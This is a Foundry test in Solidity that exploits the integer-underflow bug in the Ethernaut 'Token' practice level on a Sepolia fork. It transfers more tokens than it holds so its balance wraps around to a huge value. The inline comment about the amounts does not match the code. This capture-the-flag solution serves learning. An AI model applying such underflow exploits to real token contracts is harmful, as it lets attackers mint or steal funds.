// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/05-Token/Token.sol";

contract ContractTest is Test {
    Token level5 = Token(payable(0x3d904B522B5658535f38566C354F1aa5B47fbAb7));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x3d904B522B5658535f38566C354F1aa5B47fbAb7),
            "Ethernaut05"
        );
    }

    function testEthernaut05() public {
        level5.balanceOf(address(this));
        level5.transfer(address(0), 1); // initial balance[attacker] = 20, so minus 21 will underflow
        assert(level5.balanceOf(address(this)) > 20);
    }

    receive() external payable {}
}
